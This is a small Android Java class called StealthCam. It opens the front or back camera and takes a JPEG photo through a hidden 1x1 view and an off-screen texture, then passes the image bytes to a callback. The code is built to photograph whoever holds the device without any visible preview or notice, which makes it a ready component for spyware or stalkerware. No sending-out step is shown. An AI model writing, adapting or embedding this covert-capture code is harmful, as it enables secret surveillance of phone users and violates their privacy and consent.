//Author: KeyLo99
import android.content.Context;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.view.SurfaceView;
import android.view.ViewGroup;
import java.io.IOException;

@SuppressWarnings("deprecation")
public class StealthCam {
    public static int CAM_BACK = Camera.CameraInfo.CAMERA_FACING_BACK;
    public static int CAM_FRONT = Camera.CameraInfo.CAMERA_FACING_FRONT;
    private Camera camera;
    public interface CamAction {
        void onTaken (byte[] data);
    }
    private Context context;
    private int camInfo = 0;
    private CamAction delegate = null;
    public StealthCam(Context context, int camInfo, CamAction delegate){
        this.context = context;
        this.camInfo = camInfo;
        this.delegate = delegate;
    }
    public void takePicture(){
        try {
            SurfaceView sv = new SurfaceView(context);
            Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
            int cameraCount = Camera.getNumberOfCameras();
            for (int camIdx = 0; camIdx < cameraCount; camIdx++) {
                Camera.getCameraInfo(camIdx, cameraInfo);
                if (cameraInfo.facing == camInfo) {
                    try {
                        camera = Camera.open(camIdx);
                    } catch (RuntimeException e1) {
                        try {
                            camera = Camera.open();
                        } catch (RuntimeException e2) {
                            e2.printStackTrace();
                            delegate.onTaken(null);
                        }
                    }
                }
            }
            ViewGroup.LayoutParams param = new ViewGroup.LayoutParams(1, 1);
            sv.setLayoutParams(param);
            sv.setZOrderOnTop(true);
            SurfaceTexture surfaceTexture = new SurfaceTexture(0);
            camera.setPreviewTexture(surfaceTexture);
            camera.startPreview();
            camera.takePicture(null, null, jpegCallback);
        }catch (IOException e){
            e.printStackTrace();
        }
    }
    private Camera.PictureCallback jpegCallback = new Camera.PictureCallback() {
        public void onPictureTaken(byte[] data, Camera camera) {
            delegate.onTaken(data);
        }
    };
}
